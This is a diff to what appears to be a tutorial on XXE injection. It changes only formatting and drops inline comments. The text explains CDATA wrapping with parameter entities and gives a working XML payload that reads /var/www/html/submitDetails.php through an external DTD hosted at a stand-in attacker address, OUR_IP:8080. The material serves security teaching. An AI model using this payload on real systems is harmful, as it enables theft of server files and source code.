@@ -12,7 +12,7 @@ To start, we must first define a `begin` internal entity with `<![CDATA[`, an `e
   <!ENTITY joined "&begin;&file;&end;">
 ]>
 ```
-After that, if we reference the &joined; entity, it should contain our escaped data. However, there will be times that this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
+After that, if we reference the `&joined;` entity, it should contain our escaped data. However, there will be times that this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
 
 To bypass this, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined. First create a DTD file named `external.dtd` using the following value:
 ```dtd
@@ -27,12 +27,12 @@ Now we can reference our external entity and print the `&joined` entity we defin
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
-  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
-  <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd"> <!-- reference our external DTD -->
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd">
   %xxe;
 ]>
 ...
-<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+<email>&joined;</email>
 ```
